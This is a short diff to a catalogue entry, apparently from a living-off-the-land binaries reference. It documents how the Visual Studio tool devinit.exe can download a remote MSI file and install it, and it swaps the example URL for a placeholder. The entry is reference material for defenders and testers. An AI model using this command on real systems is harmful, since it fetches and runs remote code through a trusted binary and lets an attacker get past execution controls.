@@ -4,7 +4,7 @@ Description: Visual Studio 2019 tool
 Author: mr.d0x
 Created: 2022-01-20
 Commands:
-  - Command: devinit.exe run -t msi-install -i https://example.com/out.msi
+  - Command: devinit.exe run -t msi-install -i {REMOTEURL:.msi}
     Description: Downloads an MSI file to C:\Windows\Installer and then installs it.
     Usecase: Executes code from a (remote) MSI file.
     Category: Execute
